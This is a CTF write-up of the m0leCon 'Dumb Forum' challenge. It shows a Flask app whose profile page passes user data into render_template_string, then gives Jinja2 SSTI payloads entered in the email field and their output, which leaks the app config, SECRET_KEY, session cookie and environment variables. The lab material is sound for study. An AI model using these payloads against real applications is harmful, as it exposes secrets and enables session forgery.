---
Category:
  - Web
Difficulty: Medium
Platform: m0leCon
Status: 3. Complete
tags:
  - SSTI
  - jinja
  - flask
---
>[!quote]
> *You're telling me you can't break such a simple forum?*


# Set up

- **Dockerfile**
    
    ```bash
    # syntax=docker/dockerfile:1
    FROM python:latest
    ENV FLASK_APP=main.py
    COPY --chown=root:root . ./microforum
    WORKDIR ./microforum
    RUN useradd -ms /bin/bash app
    RUN chown -R app db/
    RUN pip3 install -r requirements.txt
    EXPOSE 8080
    USER app
    ENV FLAG='ptm{REDACTED}'
    CMD ["python", "main.py", "--host=0.0.0.0"]
    ```
    
- **docker-compose.yml**
    
    ```yaml
    version: "2.2"
    services:
      web:
        build: .
        ports:
          - 127.0.0.1:8080:8080
    ```
    
    ```bash
    ┌──(kali㉿kali)-[~/CTFs/m0lecon/DumbForum/dumbforum]
    └─$ docker-compose up
    Creating network "dumbforum_default" with the default driver
    Building web
    Sending build context to Docker daemon  95.23kB
    Step 1/11 : FROM python:latest
    latest: Pulling from library/python
    67e8aa6c8bbc: Pull complete
    627e6c1e1055: Pull complete
    0670968926f6: Pull complete
    5a8b0e20be4b: Pull complete
    b0b10a3a2784: Pull complete
    e16cd24209e8: Pull complete
    c8428195afac: Pull complete
    45ae7839fda5: Pull complete
    c8dcd06d33be: Extracting [>                                                  ]  32.77kB/2.872MB
    ...
    ```
    

# Information Gathering

Home page:

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720.png)

Profile:

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720%201.png)

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720%202.png)

# The Bug

**forms.py**

```python
...
class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    password2 = PasswordField('Repeat Password', validators=[DataRequired(), EqualTo('password')])
    submit = SubmitField('Register')

    def validate_username(self, username):
        for c in "}{":
            if c in username.data:
                raise ValidationError('Please use valid characters.')
        user = User.query.filter_by(username=username.data).first()
        if user is not None:
            raise ValidationError('Please use a different username.')

    def validate_email(self, email):
        user = User.query.filter_by(email=email.data).first()
        if user is not None:
            raise ValidationError('Please use a different email address.')
...
```

**profile.html**

```html
...
<div class="inner-profile">
        <div class="center">
          <h5 class="card-title">Username: %s</h5>
          <p>Email: %s</p>
          <p class="">About me: %s</p>
          <a href="{{ url_for('edit_profile') }}" class="btn btn-primary">Edit Profile</a>
        </div>
    <!--To do: delete /debug once the blog is complete -->
</div>
...
```

**routes.py**

```python
...
@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    with open('app/templates/profile.html') as p:
        profile_html = p.read()
    
    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)

    if(current_user.about_me == None):
        current_user.about_me = ""
    return render_template_string(profile_html)
...
```

Email: `{{self.__init__.__globals__}}`

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720%203.png)

`{{request.environ}}@maoutis.com`

```python
Username: maoutis97

Email: {'REMOTE_ADDR': '172.18.0.3', 'REMOTE_HOST': '172.18.0.3', 'REMOTE_PORT': '49298', 'REQUEST_METHOD': 'GET', 'SERVER_PORT': '8080', 'SERVER_NAME': 'waitress.invalid', 'SERVER_SOFTWARE': 'waitress', 'SERVER_PROTOCOL': 'HTTP/1.1', 'SCRIPT_NAME': '', 'PATH_INFO': '/profile', 'REQUEST_URI': '/profile', 'QUERY_STRING': '', 'wsgi.url_scheme': 'http', 'wsgi.version': (1, 0), 'wsgi.errors': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>, 'wsgi.multithread': True, 'wsgi.multiprocess': False, 'wsgi.run_once': False, 'wsgi.input': <_io.BytesIO object at 0x7fcee74d0810>, 'wsgi.file_wrapper': <class 'waitress.buffers.ReadOnlyFileBasedBuffer'>, 'wsgi.input_terminated': True, 'HTTP_HOST': 'microforum.m0lecon.fans', 'HTTP_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0', 'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'HTTP_ACCEPT_ENCODING': 'gzip, deflate', 'HTTP_ACCEPT_LANGUAGE': 'en-US,en;q=0.5', 'HTTP_COOKIE': 'session=.eJztlk1v3CAQhv_KhPMqMl8G9tpTb7lGVbQaYLCtOlCBnaiK8t9DlGN7qtJ0Uy0XYNAzvAN6EU_slFZsMzV2_PbEYOsdu6fWcCJ2YF9Knipu-4rbUnI7wM-yA1aCXB4BodK0tI0qRdgb1St293z4Nclt2SuEGfNEDWZ8IPBEGVofxet_iXzND7gub9oz3hOUCj-wtcdS4--J__s8LsgF-dvIzUrYCNYywZJhK4Ah9EXY5qV18030bl49T-JsL-YPkE_0Gl6knq3Ud0nyEdb9NEI_orS7Q_85VmozO251pz5bIjsyiSFitEkk1G6QxvqURAwqcimjcioJFVzUDsfkpaRklLfIg1XSS-sH4YY0JGMcahy410YHI9Koghi85sGhEQK1Is_RKjF6K20IVvshjU4Gi67XcnqV-KaG99YjodV02sp3yj3muIqajBs8afTC2UGOXezIEbk0SQpl-34hsucXJse67A.Yn-nBg.YJfb_GKhDaqNFk6egVSKHIDRmZU', 'HTTP_REFERER': 'https://microforum.m0lecon.fans/forums', 'HTTP_SEC_FETCH_DEST': 'document', 'HTTP_SEC_FETCH_MODE': 'navigate', 'HTTP_SEC_FETCH_SITE': 'same-origin', 'HTTP_SEC_FETCH_USER': '?1', 'HTTP_TE': 'trailers', 'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 'HTTP_X_FORWARDED_FOR': '93.51.54.187', 'HTTP_X_FORWARDED_HOST': 'microforum.m0lecon.fans', 'HTTP_X_FORWARDED_PORT': '443', 'HTTP_X_FORWARDED_PROTO': 'https', 'HTTP_X_FORWARDED_SERVER': '8b293f075ccf', 'HTTP_X_REAL_IP': '93.51.54.187', 'waitress.client_disconnected': <bound method HTTPChannel.check_client_disconnected of <waitress.channel.HTTPChannel connected 172.18.0.3:49298 at 0x7fcee7456ad0>>, 'werkzeug.request': <Request 'http://microforum.m0lecon.fans/profile' [GET]>}@maoutis2.com
```

`{{config}}@maoutis.com`

```python
Email: <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b',\xea\xec\x99\xb1\xc2O/!\xbe\x8d\x1c\x95\xa3>`\xcf\xbe[\xbbeS\x06=)\xd8\x84\x18\x92Y\xed\x91', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SQLALCHEMY_DATABASE_URI': 'sqlite:////microforum/db/app.db', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>@mconfig.com
```

# Exploitation

`{{ self.__init__.__globals__.sys.modules.os.environ }}`

```bash
In [71]: Template("My name is {{ self.__init__.__globals__.sys.modules.os.environ }} ").render()
Out[71]: "My name is environ({'SHELL': '/bin/bash', 'SESSION_MANAGER': 'local/ctf-box:@/tmp/.ICE-unix/2184,unix/ctf-box:/tmp/.ICE-unix/2184', 'PYENV_HOOK_PATH': ...}) "
```

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720%204.png)

![Untitled](../../zzz_res/attachments/Dumb%20Forum%20f7c872f465ea434a8f91745777f46720%205.png)